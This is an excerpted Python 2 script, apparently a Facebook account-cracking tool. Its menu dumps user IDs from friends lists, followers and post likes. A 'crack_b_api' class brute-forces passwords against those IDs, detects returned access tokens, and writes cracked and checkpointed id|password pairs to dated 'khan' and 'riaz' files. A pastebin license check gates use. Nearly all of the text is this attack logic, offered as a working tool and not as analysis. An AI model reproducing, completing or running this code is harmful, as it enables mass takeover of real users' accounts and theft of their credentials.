...
#https://pastebin.com/Riaz
def gagal():
    try:
        mmk = open('license.txt', 'r').read()
        plr = requests.get('https://pastebin.com/RIAZ').text
        if mmk in plr:
            os.system("clear")
            print logo3
            print 51 * '-'
...
def moch_yayan():
	...
	try:
        ...
        print " [1]. Dump (RIAZ)id from friends"
        print " [2]. Dump (RIAZ) id from public friends"
        print " [3]. Dump (RIAZ) id from total followers"
        print " [4]. Dump (RIAZ) id from like post"
        print " [5]. Start crack"
...
def results():
    print '\n'
    jalan(' %s*%s notice: type ls if there is a first name riaz/khan'%(O,P))
    time.sleep(2)
    jalan(' %s*%s example: riaz-17-April-2021.txt or khan-17-April-2021.txt'%(O,P))
    time.sleep(2)
    jalan(' %s*%s type nano riaz-17-April-2021.txt then press enter '%(O,P))
    time.sleep(2)
...
class crack_b_api:
  ...
  def krah(self):
    while True:
      ...
      if f in[""," "]:
        ...
        print '\n [#] khan results saved to : khan-%s-%s-%s.txt' % (ha, op, ta)
        print ' [#] riaz results saved to : riaz-%s-%s-%s.txt' % (ha, op, ta)
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search('(EAAA)\\w+', response.text):
      ...
      self.ok.append(wrt)
      open('khan-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
      return True
    else:
    ...
    if self.setpw == False:
      ...
      for pw in fl["pw"]:
        ...
        try:
          ...
          pass
        print '\r [*] crack: %s/%s khan-:%s - riaz-:%s%s '%(self.loop,len(self.fl),len(self.ok),len(self.cp),N),
        sys.stdout.flush()
    else:
      self.loop += 1
        ...
        try:
            for i in fl.get('pw'):
                ...
                if log.get('status') == 'success':
                    ...
                    self.ok.append(' [khan] %s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('khan.txt').read():
                        break
                    else:
                        open('khan-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' [khan] %s|%s\n\n' % (fl.get('id'), i))
                    ko = ' [khan] %s|%s\n\n' % (fl.get('id'),i)
                    break
                elif log.get('status') == 'riaz':
                    print '\r  %s* --> %s|%s      %s' % (K,fl.get('id'),i,N)
                    self.cp.append(' [riaz] %s|%s' % (fl.get('id'), i))
                    open('riaz-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' [riaz] %s|%s\n' % (fl.get('id'), i))
                    break
                else:
                    continue
            ...
            self.loop += 1
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w + ' [*] crack: %s/%s khan-:%s - riaz-:%s%s '%(self.loop,len(self.fl),len(self.khan),len(self.riaz),N),
            sys.stdout.flush()
        except:
            self.main(fl)
